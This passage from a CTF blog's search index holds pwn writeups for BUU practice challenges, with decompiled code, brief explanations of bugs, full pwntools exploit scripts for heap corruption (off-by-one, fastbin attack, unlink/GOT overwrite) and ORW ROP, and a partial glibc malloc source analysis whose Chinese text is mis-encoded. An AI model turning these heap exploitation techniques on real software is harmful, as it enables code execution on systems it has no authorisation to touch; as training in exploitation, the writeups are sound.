edit(1,p64(heap_base)) add(0x50) #2 add(0x50) #3 edit(3,'A'*0x28) free(3) show(3) main_arena = u64(sh.recvuntil('\\x7f')[-6:].ljust(8,'\\x00')) libcbase = main_arena-libc.sym['__malloc_hook']-0x70 fake_chunk = libcbase+libc.sym['__malloc_hook']-0x13 realloc =libcbase+libc.sym['__libc_realloc'] one_gadget = libcbase+one[1] leak('libc base',libcbase) add(0x50) #4 from tcache_struct edit(4,'\\x00'*0x48+p64(fake_chunk)) add(0x20) #5 edit(5,'\\x00'*(0x13-8)+p64(one_gadget)+p64(realloc+8)) add(0x10) sh.interactive() ","date":"2021-04-18","objectID":"/challenges-100-week-7/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#exp-3"},{"categories":["Writeups"],"content":"BUU-vn2020-simpleheap","date":"2021-04-18","objectID":"/challenges-100-week-7/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#buu-vn2020-simpleheap"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled ","date":"2021-04-18","objectID":"/challenges-100-week-7/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#checksec-4"},{"categories":["Writeups"],"content":"IDAadd int add() { int result; // eax int v1; // [rsp+8h] [rbp-8h] int v2; // [rsp+Ch] [rbp-4h] v1 = sub_AB2(); if ( v1 == -1 ) return puts(\"Full\"); printf(\"size?\"); result = choice(); v2 = result; if ( result \u003e 0 \u0026\u0026 result \u003c= 111 ) { *((_QWORD *)\u0026unk_2020A0 + v1) = malloc(result); if ( !*((_QWORD *)\u0026unk_2020A0 + v1) ) { puts(\"Something Wrong!\"); exit(-1); } dword_202060[v1] = v2; printf(\"content:\"); read(0, *((void **)\u0026unk_2020A0 + v1), dword_202060[v1]); result = puts(\"Done!\"); } return result; } edit int edit() { int v1; // [rsp+Ch] [rbp-4h] printf(\"idx?\"); v1 = choice(); if ( v1 \u003c 0 || v1 \u003e 9 || !qword_2020A0[v1] ) exit(0); printf(\"content:\"); sub_C39(qword_2020A0[v1], dword_202060[v1]); return puts(\"Done!\"); } show int show() { int v1; // [rsp+Ch] [rbp-4h] printf(\"idx?\"); v1 = choice(); if ( v1 \u003c 0 || v1 \u003e 9 || !qword_2020A0[v1] ) exit(0); puts((const char *)qword_2020A0[v1]); return puts(\"Done!\"); } dele int dele() { int v1; // [rsp+Ch] [rbp-4h] printf(\"idx?\"); v1 = choice(); if ( v1 \u003c 0 || v1 \u003e 9 || !qword_2020A0[v1] ) exit(0); free((void *)qword_2020A0[v1]); qword_2020A0[v1] = 0LL; dword_202060[v1] = 0; return puts(\"Done!\"); } è¾“å…¥å‡½æ•° unsigned __int64 __fastcall sub_C39(__int64 a1, int a2) { unsigned __int64 result; // rax unsigned int i; // [rsp+1Ch] [rbp-4h] for ( i = 0; ; ++i ) { result = i; if ( (int)i \u003e a2 ) break; if ( !read(0, (void *)((int)i + a1), 1uLL) ) exit(0); if ( *(_BYTE *)((int)i + a1) == 10 ) { result = (int)i + a1; *(_BYTE *)result = 0; return result; } } return result; } å”¯ä¸€çš„æ¼æ´ç‚¹å°±åœ¨è¿™ä¸ªè¾“å…¥å‡½æ•°ä¸­ï¼Œå®ƒå°†è·³å‡ºå¾ªç¯çš„æ¡ä»¶æ”¾åœ¨äº†å†…éƒ¨ï¼Œå¯¼è‡´äº†off-by-oneï¼Œä»è€Œå¯ä»¥é€šè¿‡ovlapping chunkleak libcï¼Œä¹‹åå†é€šè¿‡ä¿®æ”¹fdåˆ©ç”¨house_of_spiritï¼Œè¦†å†™__malloc_hooké…åˆ__realloc_hookå®ç°get shellã€‚ ","date":"2021-04-18","objectID":"/challenges-100-week-7/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#ida-4"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher from struct import pack leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) #context.log_level=\"DEBUG\" #context.arch=\"amd64\" local=0 binary='./vn_pwn_simpleHeap' #gdb.attach(sh) if local: sh=process(binary) else: sh=remote('node3.buuoj.cn',29656) elf = ELF(binary,checksec=False) libc = ELF('./libc-2.23.so') def add(size,content): sh.sendlineafter(': ','1') sh.sendlineafter('?',str(size)) sh.sendafter(':',str(content)) def edit(idx,content): sh.sendlineafter(': ','2') sh.sendlineafter('?',str(idx)) sh.sendafter(':',str(content)) def show(idx): sh.sendlineafter(': ','3') sh.sendlineafter('?',str(idx)) def dele(idx): sh.sendlineafter(': ','4') sh.sendlineafter('?',str(idx)) one = [0x45216,0x4526a,0xf02a4,0xf1147] local = [0x45226,0x4527a,0xf0364,0xf1207] add(0x18,'a'*0x18) #0 add(0x68,'b'*0x18) #1 0x70 add(0x68,'c'*0x18) #2 0x70 add(0x18,'d'*0x18) #3 0x20 edit(0,'\\x00'*0x18+'\\xe1') dele(1) add(0x68,'a'*8) #1 show(2) main_arena = u64(sh.recvuntil('\\x7f')[-6:].ljust(8,'\\x00'))-88 libc_base=main_arena - 0x3C4B20 malloc_hook = libc_base + 0x3c4b10 fake_chunk = malloc_hook -0x23 realloc = libc_base+0x846C0 one_gadget = libc_base + one[1] leak('main_arena', main_arena) leak('malloc_hook',malloc_hook) leak('fake_chunk', fake_chunk) leak('libc_base', libc_base) leak('one gadget',one_gadget) add(0x68,'\\n') #4--\u003e2 dele(2) edit(4,p64(fake_chunk)+'\\n') add(0x68,'\\n') add(0x68,'\\x00'*(0x13-8)+p64(one_gadget)+p64(realloc+0xd)) sh.sendlineafter(': ','1') sh.sendlineafter('?','10') sh.interactive() è¾ƒä¸ºå¸¸è§„çš„ä¸€é“é¢˜ç›® ","date":"2021-04-18","objectID":"/challenges-100-week-7/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#exp-4"},{"categories":["Writeups"],"content":"BUU-vn2020-warmup","date":"2021-04-18","objectID":"/challenges-100-week-7/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#buu-vn2020-warmup"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled ","date":"2021-04-18","objectID":"/challenges-100-week-7/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#checksec-5"},{"categories":["Writeups"],"content":"IDA __int64 __fastcall main(__int64 a1, char **a2, char **a3) { sub_80A(a1, a2, a3); puts(\"This is a easy challange for you.\"); printf(\"Here is my gift: 0x%llx\\n\", \u0026puts); sub_84D();//æ²™ç®±ï¼Œç¦ç”¨writeå’Œexceve sub_9D3(); return 0LL; } int sub_9D3() { char buf[384]; // [rsp+0h] [rbp-180h] BYREF printf(\"Input something: \"); read(0, buf, 0x180uLL); sub_9A1(); return puts(\"Done!\"); } ssize_t sub_9A1() { char buf[112]; // [rsp+0h] [rbp-70h] BYREF printf(\"What's your name?\"); return read(0, buf, 0x80uLL); } ç»™äº†æˆ‘ä»¬putsçš„åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥ä»¥æ­¤æ¥ç¡®å®šlibcåŸºå€ã€‚ä½†æ˜¯ç”±äºä¸èƒ½get shellï¼Œæ‰€ä»¥è¦æ„é€ orwçš„ROPã€‚å¼€å¯äº†PIEä¿æŠ¤ï¼Œé€‰æ‹©åœ¨libcä¸­æ‰¾gadgetï¼Œåœ¨nameå¤„å¯ä»¥æº¢å‡ºï¼Œè¦†ç›–è¿”å›åœ°å€å’Œrbpã€‚ æ³¨æ„åˆ°ï¼Œsub_9A1çš„æ ˆåº”è¯¥åœ¨sub_9D3çš„ä¸‹æ–¹ï¼Œä¸”ä¸¤è€…æ˜¯è°ƒç”¨å…³ç³»ï¼Œsub_9A1çš„bufçš„æ ˆåº”è¯¥ä¸sub_9D3ç›¸é‚»ï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦è®©æ ˆå†retåˆ°sub_9D3çš„bufé‡Œå°±å¯ä»¥ï¼Œé€šè¿‡è¦†ç›–è¿”å›åœ°å€ä¸ºpop_rdi_retï¼Œæœ€åretåˆ°ROPå¤„ã€‚ openå‡½æ•°è¿˜éœ€è¦ä¸€ä¸ªflagå­—ç¬¦ä¸²ï¼Œç”±äºç¨‹åºçš„ä½ç½®æ˜¯éšæœºçš„ï¼Œæˆ‘ä»¬å°†è¿™ä¸ªå­—ç¬¦ä¸²å†™åœ¨æ ˆä¸Šï¼Œä¾‹å¦‚free_hook ","date":"2021-04-18","objectID":"/challenges-100-week-7/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#ida-5"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher from struct import pack leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) #context.log_level=\"DEBUG\" #context.arch=\"amd64\" local=0 binary='./vn_pwn_warmup' #gdb.attach(sh) # if local: # sh=process(binary) # else: # sh=remote('node3.buuoj.cn',27261) elf = ELF(binary,checksec=False) while True: sh=remote('node3.buuoj.cn',28653) sh.recvuntil('gift: ') puts_addr=int(sh.recvuntil('\\n'),16) libc=ELF(\"libc6_2.23-0ubuntu10_amd64.so\",checksec=False) libcbase=puts_addr-libc.symbols['puts'] leak('libc base',libcbase) pop_rdi=libcbase+0x21102 pop_rsi=libcbase+0x202e8 pop_rdx=libcbase+0x1b92 open_addr=libcbase+libc.sym['open'] free_hook=libcbase+libc.sym['__free_hook'] read_addr=libcbase+libc.sym['read'] puts_addr=libcbase+libc.sym['puts'] payload=p64(0)+p64(pop_rsi)+p64(free_hook)+p64(pop_rdx)+p64(4)+p64(read_addr) payload+=p64(pop_rdi)+p64(free_hook)+p64(pop_rsi)+p64(4)+p64(open_addr) payload+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(free_hook)+p64(pop_rdx)+p64(0x30)+p64(read_addr) payload+=p64(pop_rdi)+p64(free_hook)+p64(puts_addr) try: sh.sendafter(\"Input something: \",payload) sh.sendafter(\"What's your name?\",'a'* 0x78+p64(pop_rdi)) sh.send(\"./flag\") flag = sh.recv() if 'flag' in flag: print(flag) except: sh.close() continue ","date":"2021-04-18","objectID":"/challenges-100-week-7/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#exp-5"},{"categories":["Writeups"],"content":"BUU-hitcontraining-stkof","date":"2021-04-18","objectID":"/challenges-100-week-7/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#buu-hitcontraining-stkof"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) ","date":"2021-04-18","objectID":"/challenges-100-week-7/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#checksec-6"},{"categories":["Writeups"],"content":"IDAadd __int64 sub_400936() { __int64 size; // [rsp+0h] [rbp-80h] char *v2; // [rsp+8h] [rbp-78h] char s[104]; // [rsp+10h] [rbp-70h] BYREF unsigned __int64 v4; // [rsp+78h] [rbp-8h] v4 = __readfsqword(0x28u); fgets(s, 16, stdin); size = atoll(s); v2 = (char *)malloc(size); if ( !v2 ) return 0xFFFFFFFFLL; (\u0026::s)[++chunk_count] = v2; printf(\"%d\\n\", (unsigned int)chunk_count); return 0LL; } edit __int64 sub_4009E8() { __int64 result; // rax int i; // eax unsigned int index; // [rsp+8h] [rbp-88h] __int64 size; // [rsp+10h] [rbp-80h] char *ptr; // [rsp+18h] [rbp-78h] char s[104]; // [rsp+20h] [rbp-70h] BYREF unsigned __int64 v6; // [rsp+88h] [rbp-8h] v6 = __readfsqword(0x28u); fgets(s, 16, stdin); index = atol(s); if ( index \u003e 0x100000 ) return 0xFFFFFFFFLL; if ( !(\u0026::s)[index] ) return 0xFFFFFFFFLL; fgets(s, 16, stdin); size = atoll(s); ptr = (\u0026::s)[index]; for ( i = fread(ptr, 1uLL, size, stdin); i \u003e 0; i = fread(ptr, 1uLL, size, stdin) ) { ptr += i; size -= i; } if ( size ) result = 0xFFFFFFFFLL; else result = 0LL; return result; } free __int64 sub_400B07() { unsigned int v1; // [rsp+Ch] [rbp-74h] char s[104]; // [rsp+10h] [rbp-70h] BYREF unsigned __int64 v3; // [rsp+78h] [rbp-8h] v3 = __readfsqword(0x28u); fgets(s, 16, stdin); v1 = atol(s); if ( v1 \u003e 0x100000 ) return 0xFFFFFFFFLL; if ( !(\u0026::s)[v1] ) return 0xFFFFFFFFLL; free((\u0026::s)[v1]); (\u0026::s)[v1] = 0LL; return 0LL; } show __int64 sub_400BA9() { unsigned int v1; // [rsp+Ch] [rbp-74h] char s[104]; // [rsp+10h] [rbp-70h] BYREF unsigned __int64 v3; // [rsp+78h] [rbp-8h] v3 = __readfsqword(0x28u); fgets(s, 16, stdin); v1 = atol(s); if ( v1 \u003e 0x100000 ) return 0xFFFFFFFFLL; if ( !(\u0026::s)[v1] ) return 0xFFFFFFFFLL; if ( strlen((\u0026::s)[v1]) \u003c= 3 ) puts(\"//TODO\"); else puts(\"...\"); return 0LL; } freeæ—¶é”€æ¯äº†æŒ‡é’ˆï¼Œæ²¡æœ‰UAFåˆ©ç”¨ã€‚ä½†æ˜¯å¯ä»¥ç”³è¯·ä»»æ„å¤§å°çš„å†…å­˜ï¼Œåœ¨editä¸­æœ‰æº¢å‡ºã€‚ åŒæ—¶ï¼Œæ³¨æ„åˆ°å †æŒ‡é’ˆéƒ½ä¿å­˜åœ¨.bssæ®µä¸Šçš„sä¸­ã€‚å¯ä»¥ä½¿ç”¨unlinkï¼Œå¯¹æŒ‡é’ˆè¿›è¡Œè¦†å†™ã€‚ æ³¨æ„åœ¨showä¸­ï¼Œä½¿ç”¨äº†strlenä½†æ˜¯å¹¶æ²¡æœ‰çœŸæ­£è¾“å‡ºå†…å®¹ã€‚é€šè¿‡è¦†å†™strlençš„gotè¡¨ä¸ºputsçš„pltè¡¨ã€‚å†ä¿®æ”¹å¦ä¸€ä¸ªå †å—çš„æŒ‡é’ˆä¸ºæŸgotè¡¨ï¼Œå¯ä»¥leak libcåœ°å€ã€‚ ","date":"2021-04-18","objectID":"/challenges-100-week-7/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#ida-6"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher from struct import pack leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) context.log_level=\"DEBUG\" #context.arch=\"amd64\" local=0 binary='./stkof' #gdb.attach(sh) if local: sh=process(binary) else: sh=remote('node3.buuoj.cn',28140) elf = ELF(binary,checksec=False) #libc = ELF('./libc-2.271.so') def add(size): sh.sendline('1') sh.sendline(str(size)) def edit(index,size,content): sh.sendline('2') sh.sendline(str(index)) sh.sendline(str(size)) sh.sendline(str(content)) def free(index): sh.sendline('3') sh.sendline(str(index)) heap_array = 0x602150 strlen_got = elf.got['strlen'] puts_plt = elf.plt['puts'] free_got=elf.got['free'] add(0x10) add(0x80) #2 sh.recvuntil('OK') add(0x80) #3 sh.recvuntil('OK') add(0x10) #4 sh.recvuntil('OK') edit(4,0x8,'/bin/sh\\x00') payload = p64(0)+p64(0x81)+p64(heap_array-0x18)+p64(heap_array-0x10) payload=payload.ljust(0x80,'\\x00') payload+=p64(0x80)+p64(0x90) edit(2,0x90,payload) sh.recvuntil('OK') #gdb.attach(sh) free(3) sh.recvuntil('OK') payload=p64(0)+p64(strlen_got)+p64(free_got) edit(2,0x18,payload) sh.recvuntil('OK') payload=p64(puts_plt) edit(0,0x8,payload) sh.recvuntil('OK') sh.sendline('4') sh.sendline('1') free_addr = u64(sh.recvuntil('\\x7f')[-6:].ljust(8,'\\x00')) libc = LibcSearcher('free',free_addr) libcbase = free_addr-libc.dump('free') leak('libc base',libcbase) system = libcbase+libc.dump('system') edit(1,0x8,p64(system)) free(4) sh.interactive() ","date":"2021-04-18","objectID":"/challenges-100-week-7/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#exp-6"},{"categories":["Pwning"],"content":"Glibc-2.20-mallocæºç åˆ†æç¬¬ä¸€æ¬¡çœ‹æºç ï¼Œéƒ½ç®—ä¸ä¸Šåˆ†æåªæ˜¯å†™å†™è‡ªå·±çš„ç†è§£ã€‚ä¸çŸ¥å¦‚ä½•å…¥æ‰‹ï¼Œæ‰€ä»¥è®°å½•çš„å†…å®¹éš¾å…å‡Œä¹±ç¼ºå°‘æ¡ç†ï¼Œè¿˜è¯·è§è°…ã€‚ ","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:0:0","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Mallocæºç åˆ†æ","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#glibc-220-mallocæºç åˆ†æ"},{"categories":["Pwning"],"content":"å¤§å°å’Œå¯¹é½æ£€æŸ¥ä»¥åŠè½¬æ¢","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:1:0","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Mallocæºç åˆ†æ","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#å¤§å°å’Œå¯¹é½æ£€æŸ¥ä»¥åŠè½¬æ¢"},{"categories":["Pwning"],"content":"struct malloc_chunk struct malloc_chunk { INTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize;}; æˆ‘çœå»äº†å¤§éƒ¨åˆ†çš„æè¿°ï¼Œåªä¿ç•™äº†ç»“æ„å›¾ã€‚ /* malloc_chunk details: An allocated chunk looks like this: chunk-\u003e +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk, if allocated | | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of chunk, in bytes |M|P| mem-\u003e +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | User data starts here... . . . . (malloc_usable_size() bytes) . . |nextchunk-\u003e +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of chunk | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ Free chunks are stored in circular doubly-linked lists, and look like this: chunk-\u003e +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ `head:' | Size of chunk, in bytes |P| mem-\u003e +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Forward pointer to next chunk in list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Back pointer to previous chunk in list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Unused space (may be 0 bytes long) . . . . |nextchunk-\u003e +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ `foot:' | Size of chunk, in bytes | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+*/ prev_sizeï¼šå¦‚æœå‰ä¸€ä¸ªchunkæ˜¯ç©ºé—²çš„ï¼Œè¯¥åŸŸè¡¨ç¤ºå‰ä¸€ä¸ªchunkçš„å¤§å°ï¼Œå¦‚æœå‰ä¸€ä¸ªchunkä¸ç©ºé—²ï¼Œè¯¥åŸŸæ— æ„ä¹‰ã€‚æ³¨æ„ï¼šè¿™é‡Œçš„å‰ä¸€ä¸ªæŒ‡çš„æ˜¯å­˜å‚¨ç‰©ç†ç›¸é‚»åœ°å€è¾ƒä½çš„é‚£ä¸€ä¸ªchunkã€‚ sizeï¼šè¯¥ chunk çš„å¤§å°ï¼Œå¤§å°å¿…é¡»æ˜¯ 2 * SIZE_SZ çš„æ•´æ•°å€ã€‚å¦‚æœç”³è¯·çš„å†…å­˜å¤§å°ä¸æ˜¯ 2 * SIZE_SZ çš„æ•´æ•°å€ï¼Œä¼šè¢«è½¬æ¢æ»¡è¶³å¤§å°çš„æœ€å°çš„ 2 * SIZE_SZ çš„å€æ•°ã€‚32 ä½ç³»ç»Ÿä¸­ï¼ŒSIZE_SZ æ˜¯ 4ï¼›64 ä½ç³»ç»Ÿä¸­ï¼ŒSIZE_SZ æ˜¯ 8ã€‚ è¯¥å­—æ®µçš„ä½ä¸‰ä¸ªæ¯”ç‰¹ä½å¯¹ chunk çš„å¤§å°æ²¡æœ‰å½±å“ï¼Œå®ƒä»¬ä»é«˜åˆ°ä½åˆ†åˆ«è¡¨ç¤ºï¼š A: NON_MAIN_ARENAï¼Œè®°å½•å½“å‰ chunk æ˜¯å¦ä¸å±äºä¸»çº¿ç¨‹ï¼ˆåˆ†é…åŒº/arenaï¼‰ï¼Œ1è¡¨ç¤ºä¸å±äºï¼Œ0è¡¨ç¤ºå±äºã€‚ M: IS_MAPPEDï¼Œä»–è¡¨ç¤ºå½“å‰chunkæ˜¯ä»å“ªä¸ªå†…å­˜åŒºåŸŸè·å¾—çš„è™šæ‹Ÿå†…å­˜ã€‚Mä¸º1è¡¨ç¤ºè¯¥chunkæ˜¯ä»mmapæ˜ å°„åŒºåŸŸåˆ†é…çš„ï¼Œå¦åˆ™æ˜¯ä»heapåŒºåŸŸåˆ†é…çš„ã€‚ P: PREV_INUSEï¼Œè®°å½•å‰ä¸€ä¸ª chunk å—æ˜¯å¦è¢«åˆ†é…ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œå †ä¸­ç¬¬ä¸€ä¸ªè¢«åˆ†é…çš„å†…å­˜å—çš„ size å­—æ®µçš„Pä½éƒ½ä¼šè¢«è®¾ç½®ä¸º1ï¼Œä»¥ä¾¿äºé˜²æ­¢è®¿é—®å‰é¢çš„éæ³•å†…å­˜ã€‚å½“ä¸€ä¸ª chunk çš„ size çš„ P ä½ä¸º 0 æ—¶ï¼Œæˆ‘ä»¬èƒ½é€šè¿‡ prev_size å­—æ®µæ¥è·å–ä¸Šä¸€ä¸ª chunk çš„å¤§å°ä»¥åŠåœ°å€ã€‚è¿™ä¹Ÿæ–¹ä¾¿è¿›è¡Œç©ºé—²chunkä¹‹é—´çš„åˆå¹¶ã€‚ fdï¼Œbkï¼š chunk å¤„äºåˆ†é…çŠ¶æ€æ—¶ï¼Œä» fd å­—æ®µå¼€å§‹æ˜¯ç”¨æˆ·çš„æ•°æ®ã€‚chunk ç©ºé—²æ—¶ï¼Œä¼šè¢«æ·»åŠ åˆ°å¯¹åº”çš„ç©ºé—²ç®¡ç†é“¾è¡¨ä¸­ï¼Œå…¶å­—æ®µçš„å«ä¹‰å¦‚ä¸‹ fd æŒ‡å‘ä¸‹ä¸€ä¸ªï¼ˆéç‰©ç†ç›¸é‚»ï¼‰ç©ºé—²çš„ chunk bk æŒ‡å‘ä¸Šä¸€ä¸ªï¼ˆéç‰©ç†ç›¸é‚»ï¼‰ç©ºé—²çš„ chunk fd_nextsizeï¼Œ bk_nextsizeï¼šä¹Ÿæ˜¯åªæœ‰ chunk ç©ºé—²çš„æ—¶å€™æ‰ä½¿ç”¨ï¼Œä¸è¿‡å…¶ç”¨äºè¾ƒå¤§çš„ chunkï¼ˆlarge chunkï¼‰ã€‚ fd_nextsizeæŒ‡å‘ä¸‹ä¸€ä¸ªæ¯”å½“å‰chunk sizeå°çš„ç¬¬ä¸€ä¸ªç©ºé—²chunkï¼Œä¸åŒ…å« bin çš„å¤´æŒ‡é’ˆã€‚ bk_nextszieæŒ‡å‘ä¸Šä¸€ä¸ªæ¯”å½“å‰chunk sizeå¤§çš„ç¬¬ä¸€ä¸ªç©ºé—²chunkï¼Œä¸åŒ…å« bin çš„å¤´æŒ‡é’ˆã€‚ large binsä¸­çš„ç©ºé—²chunkæ˜¯æŒ‰ç…§å¤§å°æ’åºçš„ã€‚è¿™æ ·åšå¯ä»¥é¿å…åœ¨å¯»æ‰¾åˆé€‚chunk æ—¶æŒ¨ä¸ªéå†ã€‚ æ³¨æ„ï¼šfdæ‰€æŒ‡å‘çš„æ˜¯ä»è¡¨å¤´åˆ°è¡¨å°¾æ–¹å‘ï¼Œbkåˆ™æ˜¯åè¿‡æ¥ã€‚è¿™æ ·ç†è§£ä¸‹ä¸€ä¸ªå’Œä¸Šä¸€ä¸ªçš„å«ä¹‰ã€‚ ä¸€ä¸ªå·²ç»åˆ†é…çš„ chunk çš„æ ·å­å¦‚ä¸‹ã€‚æˆ‘ä»¬ç§°å‰ä¸¤ä¸ªå­—æ®µç§°ä¸º chunk headerï¼Œåé¢çš„éƒ¨åˆ†ç§°ä¸º user dataã€‚æ¯æ¬¡ malloc ç”³è¯·å¾—åˆ°çš„å†…å­˜æŒ‡é’ˆï¼Œå…¶å®æŒ‡å‘ user data çš„èµ·å§‹å¤„ã€‚ å½“ä¸€ä¸ª chunk å¤„äºä½¿ç”¨çŠ¶æ€æ—¶ï¼Œå®ƒçš„ä¸‹ä¸€ä¸ª chunk çš„ prev_size åŸŸæ— æ•ˆï¼Œæ‰€ä»¥ä¸‹ä¸€ä¸ª chunk çš„è¯¥éƒ¨åˆ†ä¹Ÿå¯ä»¥è¢«å½“å‰chunkä½¿ç”¨ã€‚è¿™å°±æ˜¯chunkä¸­çš„ç©ºé—´å¤ç”¨ã€‚ #define chunk2mem(p) ((void*)((char*)(p) + 2*SIZE_SZ)) #define mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ)) /* The smallest possible chunk */ #define MIN_CHUNK_SIZE (offsetof(struct malloc_chunk, fd_nextsize)) /* The smallest size we can malloc is an aligned minimal chunk */ #define MINSIZE \\ (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) \u0026 ~MALLOC_ALIGN_MASK)) /* Check if m has acceptable alignment */ #define aligned_OK(m) (((unsigned long)(m) \u0026 MALLOC_ALIGN_MASK) == 0) #define misaligned_chunk(p) \\ ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem (p)) \\ \u0026 MALLOC_ALIGN_MASK) æ¯æ¬¡mallocå¾—åˆ°çš„æ˜¯memæŒ‡é’ˆï¼ŒçœŸæ­£æŒ‡å‘æ•´ä¸ªchunkçš„æ˜¯chunkæŒ‡é’ˆï¼Œå¯ä»¥é€šè¿‡ä¸Šé¢ä¸¤ä¸ªå®è¿›è¡Œè½¬æ¢ã€‚ MIN_CHUNK_SIZE å®šä¹‰äº†æœ€å°chunkçš„è‡³å°‘è¦åŒ…å«fdä¸bkæŒ‡é’ˆã€‚ MINSIZEå®šä¹‰äº†æœ€å°çš„åˆ†é…çš„å†…å­˜å¤§å°ï¼Œæ˜¯å¯¹MIN_CHUNK_SIZEè¿›è¡Œäº†2*SIZE_SZå¯¹é½ï¼Œåœ°å€å¯¹é½åä¸MIN_CHUNK_SIZEçš„å¤§å°ä»ç„¶æ˜¯ä¸€æ ·çš„ã€‚ å®aligned_OKå’Œmisaligned_chunk(p)ç”¨äºæ ¡éªŒåœ°å€æ˜¯å¦æ˜¯æŒ‰2*SIZE_SZå¯¹é½çš„ã€‚ /* Check if a request is so large that it would wrap around zero when padded and aligned. To simplify some other code, the bound is made l","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:1:1","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Mallocæºç åˆ†æ","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#struct-malloc_chunk"},{"categories":["Pwning"],"content":"ç‰©ç†chunkæ“ä½œ /* size field is or'ed with PREV_INUSE when previous adjacent chunk in use */#define PREV_INUSE 0x1/* extract inuse bit of previous chunk */#define prev_inuse(p) ((p)-\u003esize \u0026 PREV_INUSE)/* size field is or'ed with IS_MMAPPED if the chunk was obtained with mmap() */#define IS_MMAPPED 0x2/* check for mmap()'ed chunk */#define chunk_is_mmapped(p) ((p)-\u003esize \u0026 IS_MMAPPED)/* size field is or'ed with NON_MAIN_ARENA if the chunk was obtained from a non-main arena. This is only set immediately before handing the chunk to the user, if necessary. */#define NON_MAIN_ARENA 0x4/* check for chunk from non-main arena */#define chunk_non_main_arena(p) ((p)-\u003esize \u0026 NON_MAIN_ARENA) å‚è€ƒä¸Šä¸€èŠ‚ /* Bits to mask off when extracting size Note: 